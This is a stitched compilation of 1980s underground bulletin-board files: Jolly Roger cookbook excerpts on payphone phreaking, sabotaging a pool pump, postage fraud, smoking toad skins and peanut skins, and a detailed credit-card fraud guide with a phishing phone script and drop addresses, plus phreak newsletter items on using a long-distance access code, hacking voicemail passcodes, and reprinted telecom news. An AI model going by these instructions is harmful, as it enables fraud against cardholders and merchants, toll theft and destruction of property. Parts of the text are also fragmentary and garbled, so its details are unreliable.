pull  the paper clip out at the mouthpiece's end.
B> Don't  use  the paper clip at all.  Keep the nail  in  after  you punch
it.  Dial the first 6 digits.  Before dialing the last digit, touch
the nail head to the plate on the main body of the phone,  the money
safe thingy..then press the last number. The  reason  that this method
is sometimes called  clear  boxing  is because  there is
another type of phone which lets you actually make  the call  and  listen
to  them say "Hello,  hello?"  but  it  cuts  off  the mouthpiece  so they
can't hear you.  The Clear Box is used  on  that  to amplify your voice
signals and send it through the earpiece. If you  see how  this  is
even slightly similar to the method I have just described up there,
kindly explain it to ME!! Cause I don't GET IT!  Anyways,  this DOES
work on almost all single slot,  Dial Tone First payphones (Pacific Bell
for sure).  I do it all the time.  This  is  the least,  I STRESS
*LEAST*, risky form of Phreaking.

I was unable to update this one.  From what I recall, it stil worked.  
Look for payfones w/o the little volume button in the upper left of the
casing.  They should be old enough to use..        -Mondain-


Pool Fun                                        by the Jolly Roger

First of all, you need know nothing about pools.  The only thing
you need know is what a pool filter looks like.  If you don't know that.
Second, dress casual.  Preferably, in black.  Visit your
"friends" house, the one whose pool looks like fun!!)  Then you
reverse the polarity of his/her pool, by switching the wires around.
They are located in the back of the pump. This will have quite an
effect when the pump goes on.  In other words. Boooooooooooommm!
Thats right, when you mix + wires with - plugs, and vice- versa, the
4th of july happens again.
Not into total destruction??? When the pump is off, switch the
pump to "backwash".  Turn the pump on and get the phuck out!  When you
look the next day, phunny.  The pool is dry.  If you want permanant
damage, yet no great display like my first one mentioned, shut the
valves of the pool off. (There are usually 2)  One that goes to the
main drain and one that goes to the filter in the pool.  That should
be enough to have one dead pump.  The pump must take in water, so when
there isn't any...
Practical jokes:  these next ones deal with true friends and
there is *no* permanent damage done.  If you have a pool, you must
check the pool with chemicals.  There is one labeled orthotolidine.
The other is labeled alkaline (ph).  You want orthotolidine. (It
checks the chlorine). 
Go to your local pool store and tell them you're going into the pool
business, and to sell you orthotolidine (a
CL detector)   Buy this in great quantities if possible.  The solution
is clear.  You fill 2 baggies with this chemical.  And sew the bags to
the inside of your suit.  Next, go swimming with your friend!  
Then open the bags and look like you're enjoying a piss.  And anyone
there will turn a deep red!  They will be embarrased so much,
Especially if they have guests there! Explain what it is, then add
vinegar to the pool.  Only a little.  The "piss" disappears.

HAHA!!          --------------Mondain------------



Free Postage                                    by the Jolly Roger

The increasing cost of postage to mail letters and packages is
bringing down our standard of living.  To remedy this deplorable
situation, some counter control measures can be applied.
For example, if the stamps on a letter are coated with Elmer's
Glue by the sender, the cancellation mark will not destroy the stamp:
the Elmer/s drives to form an almost invisible coating that protects
the stamps from the cancellation ink. Later, the receiver of the
letter can remove the cancellation mark with water and reuse the
stamps. Furthermore, ecological saving will also result from recycling
the stamps.  Help save a tree.
The glue is most efficently applied with a brush with stiff,
short bristles.  Just dip the brush directly into the glue and spread
it on evenly, covering the entire surface of the stamp.  It will dry
in about 15 minutes.
For mailing packages, just follow the same procedure as outlined
above; however, the package should be weighed and checked to make sure
that it has the correct amount of postage on it before it is taken to
the Post Office.
Removing the cancellation and the glue from the stamps can be
easily accomplished by soaking the stamps in warm water until they
float free from the paper.  The stamps can then be put onto a paper
towel to dry.  Processing stamps in large batches saves time too.
Also, it may be helpful to write the word 'Elmer' at the top of the
letter (not on the envelope) to cue the receiving party in that the
stamps have been protected with the glue.
We all know that mailing packages can be expensive.  And we also
know that the handicapped are sometimes discriminated against in jobs.
The Government, being the generous people they are, have given the
blind free postal service.
Simply address you envelope as usual, and make one modification.
In the corner where the stamp would go, write in (or stamp) the words
'FREE MATTER FOR THE BLIND".  Then drop you package or letter in one
of the blue fedral mailboxes.  DO NOT TAKE THE LETTER TO THE POST
OFFICE, OR LEAVE IT IN YOUR MAILBOX.
Sounds very nice of the government to do this, right?  Well, they
aren't that nice.  The parcel is sent library rate, that is below
third class.  It may take four to five days to send a letter to just
the next town.
This too is quite simple, but less effective.  Put the address
that you are sending the letter to as the return address.  If you were
sending a $20 donation to the pirate's Chest, you would put our
address (po box 644, lincoln ma. 01773) as the return address.
Then you would have to be carless and forget to put the stamp on
the envelope.  A nice touch is to put a bullshit address in the center
of the envelope.
Again, you MUST drop the letter in a FEDRAL mailbox.  If the post
office doesn't send the letter to the return address for having no
stamp, they will send it back for the reason of "No such address".
Example--

Pirates Chest  Dept. 40DD
P.O. Box 644865
Lincol, Ma. 41773

                 Tom Bullshit
                 20 Fake Road
                 What Ever, XX     99851

One last thing you might try doing is soaking a cancelled stamp
off of an envelope, and gluing it onto one you are sending.  Then burn
the stamp, leaveing a little bit to show that there was one there.

Bananas:
1. Obtain 15 pounds of ripe yellow bananas
2. Peel all and eat the fruit. Save the peelings
3. Scrape all the insides of the peels with a sharp knife.
4. Put all the scraped material in a large pot and add water.
5. Boil 3 or 4 hours until it has attained a solid paste considtency.
6. Spread paste onto cookie sheets and dry in ofen for about 20
   minutes. This will result in fine black powder. Usually one will
   feel the effects after smoking three to four cigarettes.

Cough syrup:
mix robitussion a-c with an equal amount of ginger ale and drink. The
effect are sedation and euphoria. Never underestimate the effects of
any drug! You can od on cough syrup!

Toads:
1. Collect five to ten toads, frogs will not work. The best kind are
   tree toads.
2. Kill them as painlessly as possible, and skin immediately.
3. Allow the skins to dry in a refrigerator four four to five days, or
   until the skins are brittle.
4. Now crush the skins into powder and smoke. Due to its bad taste you
   can mix it with a more fragrent smoking medium.

Nutmeg:
1. Take several whole nutmegs and grind them up in an old grinder.
2. After the nutmegs are ground. Place in a mortar and pulverize with
   a pestle.
3. The usual dosage is about 10 or 15 grams. A larger dose may
   produce excessive thirst,anxiety,and rapid hart beat, but
   hallucinations are rare.

Peanuts:
1. Take 1 pound of raw peanuts (not roasted)
2. Shell them, saving the skins and discarding the shells.
3. Eat the nuts.
4. Grind up the skins and smoke them.

The Art of Carding                              by the Jolly Roger

Obtaining a credit card number: There are many ways to obtain the
information needed to card something.
The most important things needed are the card number and the expiration
date.  Having the card-holders name doesn't hurt, but it is not essential.
The absolute best way to obtain all the information needed is by trashing.
The way this is done is simple.  You walk around your area or any other
area and find a store, mall, supermarket, etc., that throws their
garbage outside on the sidewalk or dumpster.  Rip the bag open and see
if you can find any carbons at all.  If you find little shreds of
credit card carbons, then it is most likely not worth your time to tape
together.  Find a store that does not rip their carbons at all or only in half.
Another way is to bullshit the number out of someone.  That is call them
up and say "Hello, this is Visa security and we have a report that
your card was stolen." They will deny it and you will try to get it out
of them from that point on.  You could say, "It wasn't stolen?  Well what
is the expiration date and maybe we can fix the problem....
Ok and what is the number on your card?......Thank you very much and
have a nice day."  Or think of something to that degree. 
Another way to get card numbers is through systems such as TRW and CBI,
this is the hard way, and probably not worth the trouble, unless you are
an expert on the system.  Using credit card numbers posted on BBS's is
risky.  The only advantage is that there is a good chance that other
people will use it, thus decreasing the chances of being the
sole-offender.  The last method of getting numbers is very good also.
In most video rental stores, they take down your credit card number
when you join to back-up your rentals.  So if you could manage to steal
the list or make a copy of it, then you are set for a LONG time.
Choosing a victim: Once you have the card number, it is time to make the
order.  The type of places that are easiest to victimize are small
businesses that do mail order or even local stores that deliver.
If you have an ad for a place with something you want and the order number
is NOT a 1-800 number then chances are better that you will succeed.
Ordering: When you call the place up to make the order, you must have
several things readily at hand.  
These are the things you will need: A name, telephone number, business
phone, card number (4 digit bank code if the card is MasterCard),
expiration date, and a complete shipping and billing address.
I will talk about all of these in detail.  A personal tip: When I call
to make an order, it usually goes much smoother if the person you are
talking to is a woman.  In many cases they are more gullible than men.
The name:  You could use the name on the card or the name of the person
who you are going to send the merchandise to.  Or you could use the name
on the card and have it shipped to the person who lives at the drop
(Say it is a gift or something). 
The name is really not that important because when the company verifies
the card, the persons name is never mentioned, EXCEPT when you have a
Preffered Visa card.  Then the name is mentioned.  You can tell if you
have a Preffered Visa card by the PV to the right of the expiration
date on the carbon. Nophone all day long waiting for the company to call
(Which they will), then the phone number to give them as your home-phone
could be one of the following: A number that is ALWAYS busy, a number
that ALWAYS rings, a payphone number, low end of a loop (and you will wait
on the other end), or a popular BBS.
NEVER give them your home phone because they will find out as soon as
the investigation starts who the phone belongs to.  The best thing would
be to have a payphone call forward your house
(via Cosm The business number:  When asked for, repeat the number you
used for your home phone.
Card number: The cards you will use will be Visa, Mastercard, and
American Express.  The best is by far Visa.  It is the most
straight-forward.  Mastercard is pretty cool except for the bank code.
When they ask for the bank code, they sometimes also ask for the bank
that issued it.  When they ask that just say the biggest bank you know of
in your area.  Try to avoid American Express.  They tend to lead full
scale investigations.  Unfortunately, American Express is the most popular
card out.   When telling the person who is taking your call the card
number, say it slow, clear, and with confidence.
e.g. CC# is 5217-1234-5678-9012.  Pause after each set of four so you
don't have to repeat it.
Expiration date: The date must be at LEAST in that month.  It is best
to with more than three months to go.
The address: More commonly referred to as the 'drop'.  Well the drop
can range from an abandoned building to your next door neighbors
apartment.  If you plan to send it to an apartment building then be
sure NOT to include an apartment number.  This will confuse UPS or postage
men a little and they will leave the package in the lobby. 
Here is a list of various drops: The house next door whose family is on
vacation, the apartment that was just moved out of, the old church that
will be knocked down in six months, your friends house who has absolutely
nothing to do with the type of merchandise you will buy and who will
also not crack under heat from feds, etc..
There are also services that hold merchandise for you, but personally
I would not trust them.  And forget about P.O. Boxes because you need
ID to get one and most places don't ship to them anyway.
Other aspects of carding:Verifying cards, seeing if they were reported
stolen.
Verifying cards: Stores need to verify credit cards when someone purchases
something with one.  They call up a service that checks to see if the
customer has the money in the bank.
The merchant identifies himself with a merchant number.  The service
then holds the money that the merchant verified on reserve.  When the
merchant sends in the credit card form, the service sends the merchant
the money.  The service holds the money for three days and if no form
appears then it is put back into the bank.  The point is that if you
want to verify something then you should verify it for a little amount
and odds are that there will be more in the bank.
The good thing about verification is that if the card doesn't exist or
if it is stolen then the service will tell you.  To verify MasterCard
and Visa try this number.  It is voice:1-800-327-1111 merchant code is
596719.
Stolen cards: Mastercard and Visa come out with a small catalog every
week where they publish EVERY stolen or fraudulantly used card.
I get this every week by trashing the same place on the same day. 
If you ever find it trashing then try to get it every week.
Identifying cards: Visa card numbers begin with a 4 and have either 13
or 16 digits.  MasterCard card numbers begin with a 5 and have 16 digits.
American Express begins with a 3 and has 15 digits.  They all have the
formats of the following:
3xxx-xxxxxx-xxxxx   American Express
4xxx-xxx-xxx-xxx    Visa
4xxx-xxxx-xxxx-xxxx Visa
5xxx-xxxx-xxxx-xxxx MasterCard
Gold cards: A gold card simply means that credit is good for $5000. 
Without a gold card, credit would be normally $2000. 
To recognize a gold card on a carbon there are several techniques:
American Express-none.
Visa-PV instead of CV.
Note-When verifying a PV Visa, you have to have the real name of the
cardholder.
Mastercard-An asterix can signify a gold card, but this changes depending
when the card was issued.
I am going to type out a dialog between a carder and the phone operator
to help you get the idea.
Operator: "Over-priced Computer Goods, may I help you?"
Carder:   "Hi, I would like to place an order please."
Operator: "Sure, what would you like to order?"
Carder:   "400 generic disks and a double density drive."
Operator: "Ok, is there anything else?"
Carder:   "No thank you, that's all for today."
Operator: "Ok, how would you like to pay for this?  MasterCard or Visa?"
Carder:   "Visa."
Operator: "And your name is?"
Carder:   "Lenny Lipshitz." (Name on card)
Operator: "And your Visa card number is?"
Carder:   "4240-419-001-340" (Invalid card)
Operator: "Expiration date?"
Carder:   "06-92."
Operator: "And where would you like the package shipped to?"
Carder:   "6732 Goatsgate Port.  Paris,texas,010166."
Operator: "And what is your home telephone number?"
Carder:   "212-724-9970" (This number is actually always busy)
Operator: "I will also need your business phone number in case we have
to reach you."
Carder:   "You can reach me at the same number. 212-724-9970"
Operator: "O.K. Thank you very much and have nice day."
Carder:   "Excuse me, when will the package arrive?"
Operator: "In six to seven days UPS."
Carder:   "Thanks alot, and have a pleasant day."
Now you wait 6-7 days when the package will arrive to the address which
is really a house up for sale.  There will be a note on the door
saying, "Hello UPS, please leave all packages for Lenny Lipshitz in the
lobby or porch.  Thanks alot, Lenny Lipshitz" (Make the signature half-way
convincing)

Still as DANGEROUS as ever.............   MondainRecognizing credit cards                        by the Jolly Roger

  [Sample: American Express]
      XXXX XXXXXX XXXXX
      MM/Y1 THRU MM/Y2       Y1
      John Doe               AX

Explanation:
The first date is the date the person got the card, the second
date is the expriation date, after the expiration date is the same
digits in the first year.The American Express Gold has many more
numbers (I think 6 8 then 8). If you do find a Gold card keep it
for it has a $5000.00 backup even when the guy has no money!

[Sample: Master Card]
   5XXX XXXX XXXX XXXX
   XXXX AAA DD-MM-YY MM/YY
   John Doe.

Explanation:
The format varies, I have never seen a card that did not start with
a 5XXX there is another 4 digits on the next line that is sometimes
asked for when ordering stuff, (and rarely a 3 digit letter combo
(e. ANB). The first date is the date the person got the card
and the second date is the expiration date.
Master Card is almost always accepted at stores.
[Sample: VISA]
   XXXX XXX(X) XXX(X) XXX(X)
   MM/YY    MM/YY*VISA
   John Doe

Explanation:
Visa is the most straight forward
of the cards,for it has the name right on the card itself, again the
first date is the date he got the card and the second is the
expiration date. (Sometimes the first date is left out). The
numbers can eather be 4 3 3 3 or 4 4 4 4. Visa is also almost always
accepted at stores, therefore, the best of cards to use.

==========================================================================
   This section is to make  you aware  of well-known raggers and braggers.
Since this is  the first time this  section is being printed, we will tell
you what classifies people as raggers and braggers.  In  the future issues
the top raggers and braggers will be  listed in this newsletter to let the
SysOps  know who not to let on their board, or to  atleast keep an eye on.
   A ragger is someone who will put someone else  down for something.  The
person might post a message  asking a novice  question  about hacking  and
phreaking, or may  say  something  that is completely wrong, and a  ragger
will  put the  other person  down for he said, posted, etc.  The ones that
usually classify in this category are the ones that think they know it all
and consider themselves right  no matter  what anyone  says.  Most  of the
users that  use codes and  consider  themselves a  master phreaker usually
become raggers.                                                         
   A bragger is someone who either does or thinks he does know everything,
and puts it upon himself to tell  the  whole  world that he  knows it all.
This  person is also  one who thinks he is better  than  everyone else and
he believes he is Elite, and no one else is.  People  who tend to  do this
are those who have, for some reason, become well-known in the  underworld,
and as  a result become a bragger.  Those  usually not too well-known will
not tend  to brag as  much as  those who think  everyone would  love to be
their friend and be like them.                         
   As a well-known ragger and  bragger, The Toad, learned that it does not
help to be one or both of those.  He  has since  changed and is now easily
accepted by  most.  Most people  disliked him because others they knew had
said something bad about him.  This  is called peer pressure and  is a bad
influence to those who  are new to the underworld.  I would suggest in the
future,  to not judge someone by what others  say, but rather by  how they
act around/to you. 
   The current  most  popular Atarian  that  classifies as a  ragger and a
bragger is Ace of Aces, and  is well-hated by many users and SysOps, since
he tends to put  down anything anyone  says and considers himself the best
at writing hacking programs.  He is commonly  referred to as  Ass of Asses
and Ass of Assholes.  Even holding an open  mind about this guy, you would
soon come to find that what others said  coincides  with what you see from
him.                                                                      
==========================================================================
                          A New 950 has arrived!                          
==========================================================================
   LDDS, who as  mentioned above bought out TMC, is  installing  a new 950
port to most major  cities.  By the time  you read  this, it should  be in
almost every area that supports 950 ports.  The number is  950-1450.  This
port will dial 976 numbers, but not 700, 800, or 900 numbers.  The dialing
method  for LDDS is:  7 digit code, then  even if the code is  bad it will
give you a dial tone.  Then  dial the area  code  plus the number.  If you
have a bad code it will simply say your call cannot be completed as it was
dialed.  There is a default code used on the system that  currently works.
The code is simply, 1234567.  I have seen codes from 5 different companies
and they all are in the format of 00xxxxx.  I do  not  know  what  type of
software they use, but I  will  know by  the next  issue exactly what they
place  on  the bills.  This  could  be  the  answer  to  alot  of people's
problems with fear of Sprint and ITT, especially  AllNets.  Just remember,
Tracker  is the one  who  found  this, and all  information  about it.  If
someone  is seen saying  they found  this, then they will be listed in the
next issue which will contain an article on leeches.

                             Mailbox Systems                              
==========================================================================
   Mailbox systems are the link between information and the underworld. If
you have ever called one, then you will know the advantages of having one,
especially the ones that are  open to whole underworld, rather than just a
select few.  There are two types  of mailbox systems that are widely used.
   The first  type we will  talk about is the multiple mailbox systems, or
commonly referred to  as  message  systems.  These  systems  have several
mailboxes set up on one number.  Usually, you  can access other  mailboxes
from that  number  by  pressing '*' or '#'.  Sometimes you  just enter the
mailbox number and you are connected.  These are the safest systems to use
to protect information from US Sprint and other  long distance  companies.
Since US Sprint and other companies  call  the destination  numbers, it is
safer to  have 800 mailbox systems, and  most  of  the time, the  multiple
mailbox systems  are on 800 numbers.  The  passcode on  these  systems can
vary in length and can be accessed by several  different methods, so it is
impossible to explain exactly how to hack these systems.                  
   The other type is the single mailbox system.  These  are usually set up
in a reserved  prefix in an area  code.  (Ex: 713-684-6xxx)  These systems
are usually  controlled by the  same type of hardware/software.  To access
the area  where you  enter the  passcode, just hit '0' for a second or so.
The passcodes are  four (4)  digits  long.  The only way to hack  these is
manually.  The best thing you could do is to  find one that does not  have
a recording from a person, but just the  digitized voice.  If you hack one
that  someone already  owns, they will  report it and  it will not last as
long.

==============================================================================
It's been a month now, and ALOT has happened.  So much, in fact, that the
information will be split into several issues.  This should be no shock since
I mentioned in the first issue that we may put several issues out sometimes.
     I want to congratulate the readers for finally contributing to the
newsletter.  This first two issues were all on information that I, myself,
obtained.  Several people gave me information for these issues, and their

==============================================================================
     Starting from now on, we will have a BBS of the month.  We will choose a
BBS, ragardless of computer type, and look at the user participation in phreak
related matters, as well as quality discussions on the various illegal topics.
A BBS can remain the BBS of the month as long as they reside above the rest of
the BBS systems.  Even though we will sometimes bring out more than one issue
in a month, the board will remain BBS of the month until the first issue inthe
next month comes out.
     This month's BBS of the month is FBI PirateNet.  We chose this board
because of the large numbers of posts in the bases, and not only information,
but discussions as well, with a minimum number of posts from raggers and
braggers.  The number for it is 516-661-7360.  The SysOp of FBI PirateNet is
The Phantom, not to be confused with an earlier narc.

=           US Sprint Expected to Trim Staff, Consolidate Divisions          =
==============================================================================
     New York -- US Sprint Communications Corp., the troubled long distance
carrier, is expected to announce soon that it will cut its work force by
several hundred people and reduce its seven regional divisions to 3 operating
groups, sources familiar with the company said.
     The company's Pacific division is based in Burlingame, CA.  The layoffs
and reorganization are part of a plan by US Sprint's new president, Robert H.
Snedaker, to reduce heavy operating losses, which analysts expect to reach
more than $800 million this year.
     Snedaker replaced Charles M. Slibo, who was forced to resign in July
because losses were running much higher than the parent companies had
expected.  Problems with the company's computerized billing system also
contributed to Skibo's ouster.  US Sprint is owned and operated by the GTE
Corp. and United TeleCom.
     According to sources close to Snedaker, who was vice chairman and chief
operating officer of United TeleCom, he is planning to consolidate the
company's 7 divisions, which operate in the same geographical regions as the
seven regional Bell operating companies, into 3 divisions.
     The rationale for the move, according to idustry analysts, is that the
company will need a much smaller work force once it begins handling all it's
phone traffic on it's new fiber optic network, which can carry a greater
number of telephone calls at less cost.  Company officials have said that
they expect to have most of the traffic on the network by early next year.
     One source said that there would be more than one round of layoffs in the
coming months and that the company ultimately plans to reduce its 14,000
member work force by 15 percent.
     Several top managers are expected to resign as soon as US Sprint
centralizes its marketing and support operations as its headquarters in Kansas
City, MO., according to a report in the latest issue of Business Week
magazine.
     A spokesman for US Sprint said on Friday that the company would not
comment on the rumors.  The company is the nation's third largest long
distance company, after the American Telephone and Telegraph Co. (AT&T) and
MCI Communications Co.
     Last year, Washington based MCI undertook a similar reorganization in
which it posted a $502.5 million loss to write down old inventory and
restructure operations.
     Analysts said that is US Sprint is to turn a profit, the company must
increase its market share.  "To do this, US Sprint must gain more large
business customers, which account for about 80 percent of industry revenues,"
said Robert B. Morris III, Securities in San Francisco.
     Morris said that by using a slick marketing campaign to differentiate its
all-fiber telephone network from those of competitors, US Sprint more than
doubled its customer base last year.  But "most of these customers were
residential and small business users that added little to Sprint's bottom
line," he added.  "If the company expects to be profitable, it will have to
concentrate on providing the best service to volume users."

=             Secret Service Cracks Down on Teen Hackers                     =
==============================================================================
     Mount Lebanon, PA -- The US Secret Service and local police departments
have put a scare into the hacker community with a nationwide crackdown on
computer crime that has resulted in the arrests of teenage hackers in at least
three cities.
     "People who monitor the bulletin boards say there are a lot of nervous
hackers out there, wondering who will be arrested next," says Ronald E.
Freedman, vice-president of Advanced Information Management, a Woodbridge, VA
base computer security firm.
     Nine teenagers from Mount Lebanon Junior-Senior High School near
Pittsburg, PA, were arrested recently and charged with computer fraud.  The
juveniles allegedly used home computers to gain illegal access to a credit
card authorization center.  They obtained valid credit card numbers and used
them to purchase thousands of dollars worth of mail order merchandise, the
police said.
     Freedman says it appears the hackers used some relatively sophisticated
techniques in the scheme, including specially written software that enabled
them to bypass security controls and navigate through credit records to obtain
key information.
     Police officials say that the hackers also obtained access codes from
pirate bulletin board systems to make free long distance calls and gain access
to various business and government computers.
     The arrests were the result of a 6 week investigation by the Secret
Service and the Mount Lebanon police. The police were tipped off by parents
who were suspicious about how their son managed to obtain a skateboard valued
at $140.
     The Secret Service was also involved in investigations that led to the
arrests of several hackers in San Francisco and New York last July.
     Secret Service spokesman William Corbett says that although some reports
have portrayed the hackers as part of a national crime ring, the cases are
unrelated.  "It's just that a few of these computers hacking cases came to a
head at about the same time," he says.
     Federal Legislation enacted in 1984 gives the Secret Service, part of the
Department of the Treasury, a major role in investigating computer crimes.
Under the federal Computer Fraud and Abuse Act of 1986, computer fraud is a
felony that carries a maximum penalty of 5 years for the first offense, and 10
years for the second.  Displaying unauthorized passwords on hacking bulletin
boards carries a maximum penalty of 1 year in prison for the first offense,
and 10 years for the second.

=                          German Teens Crack NASA                           =
==============================================================================
     Washington, D.C. -- A group of West German teenagers from the Chaos
Computer Club penetrated a NASA network recently, saying they were doing it to
"test the security."
     What they got into was SPAN Net, a computer network with about 700 notes,
which is actually based at the Goddard Space Center in Maryland.  All that's
in there is unclassified data, space science information, and post-flight data
anaysis.  "Anyone with NASA related research can apply for access to SPAN"
says a spokesman, who adds that the network runs on DEC VAX hardware.  "We
picked up three attempts to gain access and put in security precautions so it
would't happen."  His personal opinion is, "We're happy that they couldn't get
back in, and decided to go public."  He also added that NASA has many other
networks, many of the classified and "probably inpenetrable.  But I do not
want to challenge anybody."
     How'd they get in?  Probably they got a West German NASA licensee, which
gave them a visitor's pass, then they created new passwords with unlimited
security for themselves, after which getting around the network was easy.

=                 FCC Charges Much Ado About Not Much                        =
==============================================================================
     New Cannan, CT -- International Resource Develope of New Cannan, CT says
that the market bubble for packet switch networks like TeleNet is going to
burst by 1991, regardless of what the Federal Communications Commission does
about access charges.  Cheap fiber, which greatly increases the capacity, and
ISDN services, which let you share a phone line with your computer, will do
the business in, the report says.  Over the next four years, however, the
demand for packet switch services to will grow from $650 million to $1,612
million (If the Baby Bells are allowed to add competition to the market, the
$5/hour access charge cannot be passed though to the customers anyway).

==============================================================================
     San Carlos, CA -- The Pirate's Hollow, one of the more popular BBS's in
the Bay Area, is installing several new features that will even add to it's
popularity.  For one, users will be able to gamble against each other by
betting on NFL games and participating in the Pirate's Hollow Lottery.  Also,
in order to support one of the best newsletters around, the Pirate's Hollow
will soon be adding a seperate module that will act as an outpost for The
Remote Informer.  This module will feature the older issues of the newsletter,
a section that will keep you abreast of updates of recently released
information, and a section that will show what is upcoming in the next issues
of The Remote Informer.
     The long-awaited database will soon be put online.  Over 800 textfiles
on a variety of subjects will be available to the users that pay the access
fee that will be determined at a later date.  Many more are on the way, and
will be included at no charge. The charge will be a one time charge though,
rather than a yearly payment.
     Another new option will be available by early December.  PC Pursuit
callback will be installed.  This will allow people to call and then get
called back if your area code is supported by PC Pursuit.  This will also
require a charge, to be set at a later date.
     The Pirate's Hollow has been doing well in its comeback to the
telecommunications world, but we need more callers in order to formulate a
more diverse user base.  Please spread the BBS # around while also trying to
make others aware of the newsletter.

=                               Switching Systems                            =
==============================================================================
     There are currently three different forms of switching systems that are
present in the United States today. Step by Step (SxS), Crossbar, and the
Electronic Switching System (ESS) make up the group.  Phreaks have always been
a little tenative when it comes to "doing their work" once they have heard
about effects of switching systems on their hobby.  After researching this
topic, I have found that there really is not that much to be worried about.
Read on, while I share with you information which I have compiled about all of
these switching systems and their distinct features.
     The first switching system that was used in the country was called Step
by Step.  This was adopted in 1918 by Bell, and until 1978, they had over 53%
of all their exchanges using Step by Step (SxS).  This system is known for
it's long, confusing train of switches that are used for its step by step
switching.
     Step by Step has many disadvantages to phone users.  The switch train
becomes jammed fairly often, and it causes calls to be blocked.  Also, SxS
does not allow the use of DTMF dialing. This accounts for some of the areas in
the United States that cannot have touch tone dialing abilities.  A tremendous
amount of electricity and maintenance needs to accompany the SxS switching
system, which makes it even more impratical.  All in all, this is probably the
most archaic switching system around.  
    There are a number of ways to see if you are on SxS.  You will notice that
there are no pulsing digits after dialing.  Most sources say that the phone
company will sound like many typewriters.  SxS does not offer features such as
speed calling, call forwarding, three-way calling, call waiting, and other
such services.  Pay phones on SxS also will want your money before you receive
a dial tone.  This adds to the list of disadvantages labelled to that of the
Step by Step switching systems.
     Another type of switching system that is prevalent in the United States
is Crossbar.  Crossbar has been Bell's primary switcher after 1960, and three
types of it exists.  Number 1 Crossbar (1xB), Number 4 Crossbar (4xB), and the
Number 5 Crossbar (5xB).  In Crossbar, a switching matrix is used for all the
phones in an area, and when someone calls, the route is determined and is met
up with the other phone.  This matrix is set-up in horizontal and vertical
paths.  Unlike other swichting systems, in my research, I could not come up
with any true and definate distinguishing features of the Crossbar switching
systems.
     The Electronic Switching System (ESS) is yet another switching system
used in the United States and the most used of all three swicthing systems.
ESS is an extremely advanced and multi-faced type of switching system, and is
feared by marauders of the phone company everywhere.  With ESS, your phone
company is able to know every digit dialed (including mistakes), who you call,
when you called, and how long you were connected.  ESS is also programmed to
print out the numbers of people who make excessive calls to WATS numbers (800
services) or directory assistance.  This feature of ESS is called 800
Exceptional Calling Report, and has spelled the end of some forms of
continuous code hacks to certain extenders.  ESS can also be programmed to
print logs of who called and abused certain numbers as well.  Everything is
kept track of in its records.
     The aforementioned facts show that ESS has made the jobs of organizations
such as the FBI, NSA, and other phone company security forces easier.  Tracing
can be done in a matter of microseconds, and the result will be conveniently
printed out on the monitor of a phone company officer.  ESS is also programmed
to pick up any "foreign tones" on the phone line such as the many varied tones
emulated by boxes.
     ESS can be identified by a few features common in it.  The 911 emergency
service is covered in the later versions of ESS.  Also, you are given the dial
tone first when using a pay phone unlike that of SxS.  Calling services like
call forwarding, speed calling, and call waiting are also common to ESS.  One
other feature common to ESS is ANI (Automatic Number Identification) for long
distance calls.  As you can see, ESS is basically the zenith of all switching
systems, and it will probably plague the entire country by the early 1990's.
Soon after, we should be looking forward to a system called CLASS.  This
switching system will contain the feature of having the number of the person
that is calling you printed out on your phone.
     What have I concluded about these switching systems?  Well, they are not
good enough.  I know a few people employed by the phone company, and I know
for a fact that they do not have enough time these days to worry about code
users, especially in large, metropolitan areas.  So, I will go out on a limb
here, and say that a large portion of people will never have to worry about
the horrors of ESS.

=                  New Gizmo Can Change Voice Gender                         =
==============================================================================
     The most amazing device has turned up in the new Hammacher Schlemmer
catalog:  the telephone voice gender changer.
     What it does is change the pitch of your voice from, say, soprano to bass
-- a most efficient way to dissuade an obscene phone caller just as he's
getting warmed up.
     That is not the same as running a 45 r.p.m. record at 33. In digital
conversion, the pitch can be changed without altering the speed.
     The device runs on a 9-volt batter and attaches to the telephone mouth
piece with a rubber coupler that takes but a moment to slip on and off.
     With the changer switched on, says Lloyd Gray, a Hammacher Schlemmer
technical expert, "the effect is similar to what you hear when they interview
an anonymous woman on television and disguise her voice by deepening it."
"It's better for changing a woman's voice to a man's than the other way
around," Gray said.  A man can use it to raise the pitch of his voice, but he
still won't sound like a woman."
     A man could, however, use the changer to disguise his voice. But with the
device set on high, Gray's voice still could be identified as his own. On low,
his normal tenor became so gravel like that the words were unintelligible.

=                                 AT&T Rates                                 =
==============================================================================
     WASHINGTON -- American Telephone & Telegraph Co. proposed Tuesday to
lower its interstate long-distance rates by an average of 3.6 percent to
reflect reduced costs in connecting to the local telephone network.
     The largest decrease -- 6.3 percent -- would be seen in day time prices
"because of the need to make those rates more competitive," AT&T said.
     Rates for calls made during evening hours would drop 2.2 percent and
calls made during the late night and weekends would be cut by 0.8 percent, the
company said.
     The rate reductions would take effect Jan. 1, if they are approved by the
Federal Communications Commission.
     Reacting to the proposed price cuts, MCI Communications Corp. and US
Sprint Communications Co., the nation's second-largest and third-largest long
distance companies respectively, said their response would depend on what the
FCC finally approves but both said they intended to remain competitive with
AT&T. AT&T, the nation's largest long-distance company, proposed to the FCC
that its rates drop as much as $800 million, but AT&T said the exact amount
will depend on the access charges the FCC allows the local telephone companies
to collect from long distance carriers, which must pay the fees to hook into
the phone local network.
     AT&T has challenged the new access rates filed by the regional Bell
operating companies, contending they are more than $1 billion too high.
In proposing its new rates, the long-distance leader told the FCC it
expects local companies' access fees to fall by at least $200 million -- which
would amount to an average rate reduction of less than 1 percent.  But the
company said it believes the FCC will order an additional $600 million in
reductions based on AT&T's challenge.
     "We're confident the FCC will recognize that access charges filed by the
local telephone companies need to be substantially reduced, which would mean
more savings for our customers," said Larry Garfinkel, AT&T vice president for
marketing.
     He said the company filed its proposed rates based on disputed charges
because "we wanted to let the public react ... and further to let the FCC have
full knowledge of where we were heading given our expectation that we had a
valid basis for our dispute."
     AT&T's long-distance rates have fallen by about 34 percent since the
company was stripped of its local operating companies by an antitrust decree
nearly four years ago.
     Since then, phone rate payers have been paying a larger share of the costs
of maintaining the local network through monthly subscriber line charges, now
$2.60 for residential customers.
     That has reduced the long-distance companies' share of local network
expenses, which they pay in the form of access charges.
     Jack Grubman, a telephone analyst with PaineWebber Inc., said AT&T's
proposal targets business customers because "that's where the competition is
and where the better (profit) margins are." In addition, it aims to keep the
pressure on competition in international calling by extending discounts to
more customers. Grubman added that, if the company's rate proposal is approved
by the FCC, he would expect no further cuts in AT&T rates in 1988.
     Wendell Lind, AT&T administrator of rates and tariffs, said the cuts for
business and residential customers are about the same because business cuts
are offset by a proposed $128 million increase in AT&T's private line rates.
     AT&T is the only long-distance company whose rates are regulated by the
FCC, but its prices set the pace for the industry. Though AT&T is far larger
than any of its competitors, its market share has been declining since
